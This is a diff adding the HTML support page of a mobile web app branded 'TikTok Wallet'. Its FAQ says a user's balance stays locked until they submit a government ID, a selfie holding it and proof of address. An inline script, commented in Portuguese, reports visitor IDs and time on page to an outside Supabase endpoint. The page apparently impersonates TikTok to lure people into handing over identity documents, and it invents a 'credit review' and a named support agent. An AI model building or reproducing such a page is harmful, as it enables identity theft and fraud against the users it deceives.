@@ -1,0 +1,436 @@
+<!doctype html>
+<html lang="en-US">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
+    <meta name="theme-color" content="#F5F5F8">
+    
+    <meta name="csrf-token" content="PdcJYaCR5uInm62Kc50Gj4p5b6VNLaMJ10YSDovG">
+    <script src="/js/wallet-shim.js"></script>
+    <title>Support</title>
+    <link rel="stylesheet" href="/css/tokens.css">
+    <link rel="stylesheet" href="/css/shell.css">
+    <link rel="stylesheet" href="/css/components.css">
+    <link rel="icon" type="image/svg+xml" href="/favicon.svg">
+    
+    <script src="/js/vendor/turbo.min.js"></script>
+    <script src="/js/app.js" defer></script>
+    <script src="/js/lead.js" defer></script>
+    <script src="/js/vendor/alpine.min.js" defer></script>
+</head>
+<body>
+
+<div class="app-shell" x-data="{ sheetOpen: false, uploadOpen: false, cardDetails: false, cardLimit: false, cardPin: false, cardDesign: false }">
+
+    <header class="app-header">
+        <img class="app-header__logo" src="/images/logo.webp" alt="TikTok Wallet" width="82" height="24">
+
+        <div class="app-header__actions">
+            
+            <button type="button" class="app-header__bell" @click="sheetOpen = true"
+                    aria-label="Notifications"
+                    x-data="{ unread: 0 }"
+                    @support-unread.window="unread = Math.max($event.detail.unread, 0)">
+                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="24" height="24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><path d="M6 8a6 6 0 0 1 12 0c0 7 3 9 3 9H3s3-2 3-9"/><path d="M10.3 21a1.94 1.94 0 0 0 3.4 0"/></svg>
+                <span class="app-header__dot" aria-hidden="true" x-show="unread > 0"
+                       style="display:none" ></span>
+            </button>
+        </div>
+    </header>
+
+    <main class="app-main  " id="screen">
+            
+    <div x-data="{ topic: 'account', open: null }">
+
+        
+        <div class="topic-bar">
+            <div class="topic-bar__head">
+                <button type="button" class="topic-bar__back" aria-label="Back"
+                        @click="history.length > 1 ? history.back() : Turbo.visit('/')">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="24" height="24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><path d="m15 18-6-6 6-6"/></svg>
+                </button>
+
+                <h1 class="topic-bar__title">TikTok Support</h1>
+            </div>
+
+            <div class="topic-bar__chips" role="tablist" aria-label="Support topics">
+                                    <button type="button" class="topic-chip" role="tab"
+                            :class="topic === 'account' && 'topic-chip--active'"
+                            :aria-selected="topic === 'account' ? 'true' : 'false'"
+                            @click="topic = 'account'; open = null">
+                        Account
+                    </button>
+                                    <button type="button" class="topic-chip" role="tab"
+                            :class="topic === 'verification' && 'topic-chip--active'"
+                            :aria-selected="topic === 'verification' ? 'true' : 'false'"
+                            @click="topic = 'verification'; open = null">
+                        Verification and documents
+                    </button>
+                                    <button type="button" class="topic-chip" role="tab"
+                            :class="topic === 'balance' && 'topic-chip--active'"
+                            :aria-selected="topic === 'balance' ? 'true' : 'false'"
+                            @click="topic = 'balance'; open = null">
+                        Balance and withdrawals
+                    </button>
+                                    <button type="button" class="topic-chip" role="tab"
+                            :class="topic === 'privacy' && 'topic-chip--active'"
+                            :aria-selected="topic === 'privacy' ? 'true' : 'false'"
+                            @click="topic = 'privacy'; open = null">
+                        Privacy and safety
+                    </button>
+                            </div>
+        </div>
+
+        <section class="screen stack--loose">
+
+            
+            <a class="contact-btn enter" style="--i:0" href="/support/chat"
+               @click="window.track('support_chat_entry_clicked')">
+                <span class="contact-btn__icon" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="24" height="24" fill="currentColor" stroke="none" aria-hidden="true" focusable="false"><path fill-rule="evenodd" clip-rule="evenodd" d="M5 2.5h14A3.5 3.5 0 0 1 22.5 6v9a3.5 3.5 0 0 1-3.5 3.5h-6.2l-4.5 3.3A1.25 1.25 0 0 1 6.3 20.8v-2.3H5A3.5 3.5 0 0 1 1.5 15V6A3.5 3.5 0 0 1 5 2.5Zm3.4 6.7a1.1 1.1 0 0 0-1.7 1.4 6.9 6.9 0 0 0 10.6 0 1.1 1.1 0 0 0-1.7-1.4 4.7 4.7 0 0 1-7.2 0Z"/></svg>
+</span>
+                <span class="contact-btn__label">Chat with live support</span>
+
+                            </a>
+
+            <h2 class="screen__title">Frequently asked questions</h2>
+
+            
+                            <div class="faq enter" style="--i:1" x-show="topic === 'account'" x-cloak>
+                                                                    <div class="faq__item" :class="open === 'account-0' && 'faq__item--open'">
+                            <button type="button" class="faq__question"
+                                    @click="open = open === 'account-0' ? null : 'account-0'"
+                                    :aria-expanded="open === 'account-0' ? 'true' : 'false'"
+                                    aria-controls="faq-answer-account-0">
+                                <span>How long does the review take?</span>
+                                <span class="faq__chevron" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="24" height="24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><path d="m6 9 6 6 6-6"/></svg>
+</span>
+                            </button>
+
+                            <div class="faq__answer" id="faq-answer-account-0">
+                                <div>
+                                    <p class="faq__text">The review takes a few days and the timeline varies from account to account. As soon as your documents are submitted, the Verification screen shows which day your review is on and how many days are left.</p>
+                                </div>
+                            </div>
+                        </div>
+                                                                    <div class="faq__item" :class="open === 'account-1' && 'faq__item--open'">
+                            <button type="button" class="faq__question"
+                                    @click="open = open === 'account-1' ? null : 'account-1'"
+                                    :aria-expanded="open === 'account-1' ? 'true' : 'false'"
+                                    aria-controls="faq-answer-account-1">
+                                <span>How do I follow the progress of the review?</span>
+                                <span class="faq__chevron" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="24" height="24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><path d="m6 9 6 6 6-6"/></svg>
+</span>
+                            </button>
+
+                            <div class="faq__answer" id="faq-answer-account-1">
+                                <div>
+                                    <p class="faq__text">On the Verification tab. It shows the current day, the percentage complete and every review step, which move forward on their own — there is no need to resubmit documents or contact anyone.</p>
+                                </div>
+                            </div>
+                        </div>
+                                                                    <div class="faq__item" :class="open === 'account-2' && 'faq__item--open'">
+                            <button type="button" class="faq__question"
+                                    @click="open = open === 'account-2' ? null : 'account-2'"
+                                    :aria-expanded="open === 'account-2' ? 'true' : 'false'"
+                                    aria-controls="faq-answer-account-2">
+                                <span>Can I open a second account to speed this up?</span>
+                                <span class="faq__chevron" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="24" height="24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><path d="m6 9 6 6 6-6"/></svg>
+</span>
+                            </button>
+
+                            <div class="faq__answer" id="faq-answer-account-2">
+                                <div>
+                                    <p class="faq__text">No. Each person is allowed one account, and a second one does not start a new review — it only puts both accounts under scrutiny. Wait for the review already running on this account.</p>
+                                </div>
+                            </div>
+                        </div>
+                                    </div>
+                            <div class="faq enter" style="--i:1" x-show="topic === 'verification'" x-cloak>
+                                                                    <div class="faq__item" :class="open === 'verification-0' && 'faq__item--open'">
+                            <button type="button" class="faq__question"
+                                    @click="open = open === 'verification-0' ? null : 'verification-0'"
+                                    :aria-expanded="open === 'verification-0' ? 'true' : 'false'"
+                                    aria-controls="faq-answer-verification-0">
+                                <span>Which documents are required for verification?</span>
+                                <span class="faq__chevron" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="24" height="24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><path d="m6 9 6 6 6-6"/></svg>
+</span>
+                            </button>
+
+                            <div class="faq__answer" id="faq-answer-verification-0">
+                                <div>
+                                    <p class="faq__text">Three of them: a government-issued ID (driver&#039;s license or passport, front and back), a selfie holding that ID, and a proof of address from the last 90 days.</p>
+                                </div>
+                            </div>
+                        </div>
+                                                                    <div class="faq__item" :class="open === 'verification-1' && 'faq__item--open'">
+                            <button type="button" class="faq__question"
+                                    @click="open = open === 'verification-1' ? null : 'verification-1'"
+                                    :aria-expanded="open === 'verification-1' ? 'true' : 'false'"
+                                    aria-controls="faq-answer-verification-1">
+                                <span>I submitted my documents. What happens next?</span>
+                                <span class="faq__chevron" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="24" height="24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><path d="m6 9 6 6 6-6"/></svg>
+</span>
+                            </button>
+
+                            <div class="faq__answer" id="faq-answer-verification-1">
+                                <div>
+                                    <p class="faq__text">The review starts on the same day and runs step by step: documents received, identity verification, credit review, security check, pre-approval and final review. Every step appears on the Verification tab as it is reached.</p>
+                                </div>
+                            </div>
+                        </div>
+                                                                    <div class="faq__item" :class="open === 'verification-2' && 'faq__item--open'">
+                            <button type="button" class="faq__question"
+                                    @click="open = open === 'verification-2' ? null : 'verification-2'"
+                                    :aria-expanded="open === 'verification-2' ? 'true' : 'false'"
+                                    aria-controls="faq-answer-verification-2">
+                                <span>Can I replace a document I already sent?</span>
+                                <span class="faq__chevron" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="24" height="24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><path d="m6 9 6 6 6-6"/></svg>
+</span>
+                            </button>
+
+                            <div class="faq__answer" id="faq-answer-verification-2">
+                                <div>
+                                    <p class="faq__text">Yes, until the review starts. After it starts the set is locked and the analyst works with what was submitted.</p>
+                                </div>
+                            </div>
+                        </div>
+                                    </div>
+                            <div class="faq enter" style="--i:1" x-show="topic === 'balance'" x-cloak>
+                                                                    <div class="faq__item" :class="open === 'balance-0' && 'faq__item--open'">
+                            <button type="button" class="faq__question"
+                                    @click="open = open === 'balance-0' ? null : 'balance-0'"
+                                    :aria-expanded="open === 'balance-0' ? 'true' : 'false'"
+                                    aria-controls="faq-answer-balance-0">
+                                <span>Why can I not withdraw my balance yet?</span>
+                                <span class="faq__chevron" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="24" height="24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><path d="m6 9 6 6 6-6"/></svg>
+</span>
+                            </button>
+
+                            <div class="faq__answer" id="faq-answer-balance-0">
+                                <div>
+                                    <p class="faq__text">The balance stays locked while the account is not verified. It is a security requirement: withdrawals are released only after the account holder&#039;s identity is confirmed.</p>
+                                </div>
+                            </div>
+                        </div>
+                                                                    <div class="faq__item" :class="open === 'balance-1' && 'faq__item--open'">
+                            <button type="button" class="faq__question"
+                                    @click="open = open === 'balance-1' ? null : 'balance-1'"
+                                    :aria-expanded="open === 'balance-1' ? 'true' : 'false'"
+                                    aria-controls="faq-answer-balance-1">
+                                <span>What happens if the withdrawal is denied?</span>
+                                <span class="faq__chevron" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="24" height="24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><path d="m6 9 6 6 6-6"/></svg>
+</span>
+                            </button>
+
+                            <div class="faq__answer" id="faq-answer-balance-1">
+                                <div>
+                                    <p class="faq__text">The account keeps its balance locked and the reason for the denial appears on the Verification screen. The history of the review steps stays available for reference.</p>
+                                </div>
+                            </div>
+                        </div>
+                                    </div>
+                            <div class="faq enter" style="--i:1" x-show="topic === 'privacy'" x-cloak>
+                                                                    <div class="faq__item" :class="open === 'privacy-0' && 'faq__item--open'">
+                            <button type="button" class="faq__question"
+                                    @click="open = open === 'privacy-0' ? null : 'privacy-0'"
+                                    :aria-expanded="open === 'privacy-0' ? 'true' : 'false'"
+                                    aria-controls="faq-answer-privacy-0">
+                                <span>What do you do with the documents I send?</span>
+                                <span class="faq__chevron" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="24" height="24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><path d="m6 9 6 6 6-6"/></svg>
+</span>
+                            </button>
+
+                            <div class="faq__answer" id="faq-answer-privacy-0">
+                                <div>
+                                    <p class="faq__text">They are used for the account review only, handled by the review team and never shared with other users.</p>
+                                </div>
+                            </div>
+                        </div>
+                                                                    <div class="faq__item" :class="open === 'privacy-1' && 'faq__item--open'">
+                            <button type="button" class="faq__question"
+                                    @click="open = open === 'privacy-1' ? null : 'privacy-1'"
+                                    :aria-expanded="open === 'privacy-1' ? 'true' : 'false'"
+                                    aria-controls="faq-answer-privacy-1">
+                                <span>How do I know a message really comes from support?</span>
+                                <span class="faq__chevron" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="24" height="24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><path d="m6 9 6 6 6-6"/></svg>
+</span>
+                            </button>
+
+                            <div class="faq__answer" id="faq-answer-privacy-1">
+                                <div>
+                                    <p class="faq__text">Support only talks to you inside this app, on the live chat of this screen. We never ask for passwords, card numbers or payments over email, SMS or any other messenger.</p>
+                                </div>
+                            </div>
+                        </div>
+                                    </div>
+                    </section>
+    </div>
+    </main>
+
+            <nav class="app-tabbar" aria-label="Main navigation">
+            
+        <a class="app-tabbar__item"
+           href="/"
+           >
+            <span class="app-tabbar__glyph">
+                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="24" height="24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><path d="m3 9 9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"/><path d="M9 22V12h6v10"/></svg>
+                            </span>
+            <span>Home</span>
+        </a>
+            
+        <a class="app-tabbar__item"
+           href="/verification"
+           >
+            <span class="app-tabbar__glyph">
+                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="24" height="24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><path d="m17 8-5-5-5 5"/><path d="M12 3v12"/></svg>
+                            </span>
+            <span>Verification</span>
+        </a>
+            
+        <a class="app-tabbar__item"
+           href="/cards"
+           >
+            <span class="app-tabbar__glyph">
+                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="24" height="24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><rect x="2" y="5" width="20" height="14" rx="2"/><path d="M2 10h20"/></svg>
+                            </span>
+            <span>Cards</span>
+        </a>
+            
+        <a class="app-tabbar__item"
+           href="/support"
+            aria-current="page" >
+            <span class="app-tabbar__glyph">
+                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="24" height="24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><circle cx="12" cy="12" r="10"/><path d="M9.1 9a3 3 0 0 1 5.8 1c0 2-3 3-3 3"/><path d="M12 17h.01"/></svg>
+                            </span>
+            <span>Support</span>
+        </a>
+    </nav>
+    
+    <div class="sheet" x-cloak x-show="sheetOpen" role="dialog" aria-modal="true"
+     aria-label="Notifications" @keydown.escape.window="sheetOpen = false">
+
+    <div class="sheet__backdrop"
+         x-show="sheetOpen"
+         x-transition.opacity.duration.200ms
+         @click="sheetOpen = false"></div>
+
+    <div class="sheet__panel"
+         x-show="sheetOpen"
+         x-transition:enter="sheet__panel--anim"
+         x-transition:enter-start="sheet__panel--down"
+         x-transition:leave="sheet__panel--anim"
+         x-transition:leave-end="sheet__panel--down"
+         x-data="{ dragFrom: null, dragBy: 0 }"
+         @click.stop
+         @touchstart="dragFrom = $event.touches[0].clientY; dragBy = 0"
+         @touchmove="if (dragFrom !== null) {
+                         dragBy = Math.max(0, $event.touches[0].clientY - dragFrom);
+                         $el.style.transform = 'translateY(' + dragBy + 'px)';
+                     }"
+         @touchend="$el.style.removeProperty('transform');
+                    if (dragBy > 80) sheetOpen = false;
+                    dragFrom = null; dragBy = 0">
+
+        <div class="sheet__grip" aria-hidden="true"></div>
+
+        <div class="sheet__head">
+            <h2 class="sheet__title">Notifications</h2>
+            <button type="button" class="sheet__close" @click="sheetOpen = false" aria-label="Close">
+                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="24" height="24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><path d="M18 6 6 18"/><path d="m6 6 12 12"/></svg>
+            </button>
+        </div>
+
+        <div class="sheet__body"><div class="stack" x-data="{ unread: 0 }"
+             @support-unread.window="unread = $event.detail.unread">
+
+            
+            <a class="notify-row" href="/support/chat" x-show="unread > 0"
+                x-cloak >
+                <span class="notify-row__icon" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="24" height="24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><path d="M7.9 20A9 9 0 1 0 4 16.1L2 22z"/></svg>
+</span>
+                <span class="notify-row__body">
+                    <span class="notify-row__title">Sarah Mitchell replied</span>
+                    <span class="notify-row__text" x-text="unread === 1 ? '1 new message in your support chat' : unread + ' new messages in your support chat'">
+                        0 new messages in your support chat
+                    </span>
+                </span>
+                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="24" height="24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><path d="m9 18 6-6-6-6"/></svg>
+            </a>
+
+                            <p class="empty__text" x-show="unread === 0" >
+                    No notifications right now.
+                </p>
+                    </div></div>
+    </div>
+</div>
+
+    
+    
+    
+    
+    <div class="toast" id="toast" role="status" aria-live="polite"
+     >
+    <span class="toast__text" id="toast-text"></span>
+</div>
+</div>
+
+
+<script>
+(function () {
+  var URL_ = "https://hrlmqwkgruexsxpqmxje.supabase.co/functions/v1/wallet-track";
+  var EMAIL = null;
+
+  function id(chave, store) {
+    try {
+      var v = store.getItem(chave);
+      if (!v) { v = Math.random().toString(36).slice(2) + Date.now().toString(36); store.setItem(chave, v); }
+      return v;
+    } catch (e) { return "sem-storage"; }
+  }
+
+  // visitor sobrevive ao fechar o navegador — é ele que responde "abre todo dia?".
+  // sessao morre com a aba: é a unidade do tempo de uso.
+  var visitor = id("w_visitor", window.localStorage);
+  var sessao = id("w_sessao", window.sessionStorage);
+
+  // Tempo REAL de olho na tela. Sem parar o relógio quando a aba esconde, um celular
+  // esquecido aberto vira "40 minutos de uso" e a média mente para todo mundo.
+  var segundos = 0, ultimo = Date.now(), visivel = !document.hidden;
+
+  function tick() {
+    var agora = Date.now();
+    if (visivel) segundos += (agora - ultimo) / 1000;
+    ultimo = agora;
+  }
+
+  function manda(evento, viaBeacon) {
+    tick();
+    var corpo = JSON.stringify({
+      visitor: visitor, sessao: sessao, evento: evento, email: EMAIL,
+      rota: location.pathname, segundos: Math.round(segundos),
+      ref: document.referrer || null
+    });
+    try {
+      // sendBeacon é o único que sobrevive à aba fechando
+      if (viaBeacon && navigator.sendBeacon) {
+        navigator.sendBeacon(URL_, new Blob([corpo], { type: "application/json" }));
+        return;
+      }
+      fetch(URL_, { method: "POST", headers: { "Content-Type": "application/json" },
+                    body: corpo, keepalive: true }).catch(function () {});
+    } catch (e) {}
+  }
+
+  document.addEventListener("visibilitychange", function () {
+    tick();
+    visivel = !document.hidden;
+    if (document.hidden) manda("ping", true);
+  });
+
+  manda("open");
+  setInterval(function () { manda("ping"); }, 20000);
+  window.addEventListener("pagehide", function () { manda("saida", true); });
+})();
+</script>
+</body>
+</html>
